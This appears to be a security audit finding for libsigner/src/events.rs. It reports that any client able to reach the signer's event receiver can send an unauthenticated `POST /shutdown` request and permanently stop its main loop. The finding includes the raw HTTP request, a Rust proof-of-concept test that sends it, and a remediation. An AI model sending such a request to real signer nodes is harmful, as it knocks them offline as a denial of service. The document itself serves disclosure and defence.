### Title
Unauthenticated remote `/shutdown` POST permanently terminates `SignerEventReceiver::main_loop` - (File: libsigner/src/events.rs)

### Summary
`SignerEventReceiver::next_event` dispatches any incoming HTTP request whose URL matches `/shutdown` by setting `stop_signal` to `true` and returning `Err(EventError::Terminated)`, with no check on the request's origin, headers, or body. Since the event endpoint is bound as a plain `tiny_http` TCP listener via `EventReceiver::bind`, any remote party that can open a TCP connection to that address and send `POST /shutdown` can terminate the signer's event pipeline permanently.

### Finding Description
The intended invariant is that the event receiver should only stop when the local process explicitly calls `SignerStopSignaler::send()` [1](#0-0) , which itself connects to `self.local_addr` and issues the same `POST /shutdown` request over a fresh loopback-directed TCP connection [2](#0-1) . However, the actual dispatch logic in `next_event` treats the URL string match alone as sufficient authorization to trigger shutdown:

```rust
} else if request.url() == "/shutdown" {
    event_receiver.stop_signal.store(true, Ordering::SeqCst);
    Err(EventError::Terminated)
}
``` [3](#0-2) 

There is no verification of source IP/socket, no shared secret, no token, and no session state distinguishing "the local stop-signaler's own connection" from any other TCP client that connects to the bound `HttpServer` and sends a matching request line. `bind()` simply opens a `tiny_http::HttpServer` on the configured listener address with no additional access control layer [4](#0-3) . Once `Err(EventError::Terminated)` propagates out of `next_event`, `main_loop` matches on it explicitly and breaks out of the loop for good [5](#0-4) ; because `main_loop` is not re-entered, this is a one-shot, permanent termination of event processing, not a recoverable "unrecognized event" case (contrast with `EventError::UnrecognizedEvent` on line 292, which is `continue`d).

The exploit flow: an attacker who can reach the signer's event-receiver bound address (whatever address/port the operator configured it to listen on) opens a raw TCP connection and sends:
```
POST /shutdown HTTP/1.1
Host: <addr>
Content-Length: 4

body
```
`tiny_http`'s `HttpServer::recv()` returns this as a valid `HttpRequest` with `method() == Post` and `url() == "/shutdown"`; it satisfies both branch conditions in the dispatcher (method-post check followed by URL match at line 443), with no further authentication gate present anywhere between `bind()` and this match arm.

### Impact Explanation
Any remote party able to reach the event-receiver socket can, with a single crafted HTTP request, permanently disable that signer's ingestion of `/stackerdb_chunks`, `/proposal_response`, `/new_burn_block`, and `/new_block` events — i.e., the signer stops receiving new StackerDB messages, burn/new block notifications, and block-proposal validation responses from its node, effectively taking the signer offline from the node's perspective until it is manually restarted. This matches the "Critical - remote crash/unauthenticated DoS from few messages" category, since it requires exactly one message and yields total, non-self-healing termination of the receiver thread's main loop (`is_stopped()` becomes permanently `true`, `main_loop` exits at line 299 and does not restart).

### Likelihood Explanation
The only precondition is TCP reachability to whatever address the operator has bound the signer's event receiver to. No secret, peer identity, StackerDB slot ownership, or other privilege is required — the request is unauthenticated by design in the current code, and cost to the attacker is a single crafted HTTP POST. Repeatability is trivial (the attacker can resend the same request against any restarted instance, and once one connection succeeds the effect is permanent for that process lifetime).

### Recommendation
Remove the network-reachable `/shutdown` route entirely, or gate it behind an authentication mechanism that only the local `SignerStopSignaler` can satisfy (e.g., a per-process random shared secret sent as a header/body and checked before storing the stop signal, or restricting the listener to loopback/only accepting the shutdown path from a connection whose peer address is verified to be localhost). At minimum, verify `request.remote_addr()` corresponds to the local host before honoring `/shutdown`, and consider using a same-process channel (e.g., in-memory `AtomicBool` write triggered by an internal call rather than an HTTP path) instead of a self-directed loopback POST.

### Proof of Concept
```rust
// libsigner/src/events.rs (test module) or a standalone integration test
use std::net::{TcpStream, SocketAddr};
use std::io::Write;
use std::thread;

#[test]
fn unauthenticated_remote_shutdown_terminates_receiver() {
    let mut receiver: SignerEventReceiver<SomeSignerMessageType> = SignerEventReceiver::new(false);
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap(); // or a non-loopback bind in prod config
    let bound_addr = receiver.bind(addr).unwrap();

    let handle = thread::spawn(move || {
        receiver.main_loop();
        receiver // return to check is_stopped() after loop exit
    });

    // Unrelated attacker client — never touches get_stop_signaler/SignerStopSignaler::send
    let mut stream = TcpStream::connect(bound_addr).unwrap();
    let body = "attacker";
    let req = format!(
        "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}",
        bound_addr, body.len(), body
    );
    stream.write_all(req.as_bytes()).unwrap();

    let receiver_after = handle.join().unwrap(); // main_loop must exit
    assert!(receiver_after.is_stopped()); // stop_signal set to true by an unauthenticated remote POST
}
```
Expected result: `main_loop` exits (assertion passes) purely from the attacker's raw POST, without ever invoking `SignerEventReceiver::get_stop_signaler` or `SignerStopSignaler::send`, confirming the broken authenticity invariant at `libsigner/src/events.rs:443-445`.

### Citations

**File:** libsigner/src/events.rs (L254-260)
```rust
/// Trait to implement a stop-signaler for the event receiver thread.
/// The caller calls `send()` and the event receiver loop (which lives in a separate thread) will
/// terminate.
pub trait EventStopSignaler {
    /// Send the stop signal
    fn send(&mut self);
}
```

**File:** libsigner/src/events.rs (L296-300)
```rust
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
```

**File:** libsigner/src/events.rs (L376-396)
```rust
impl EventStopSignaler for SignerStopSignaler {
    #[cfg_attr(test, mutants::skip)]
    fn send(&mut self) {
        self.stop_signal.store(true, Ordering::SeqCst);
        // wake up the thread so the atomicbool can be checked
        // This makes me sad...but for now...it works.
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
        }
    }
}
```

**File:** libsigner/src/events.rs (L404-408)
```rust
    fn bind(&mut self, listener: SocketAddr) -> Result<SocketAddr, EventError> {
        self.http_server = Some(HttpServer::http(listener).expect("failed to start HttpServer"));
        self.local_addr = Some(listener);
        Ok(listener)
    }
```

**File:** libsigner/src/events.rs (L443-445)
```rust
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
```
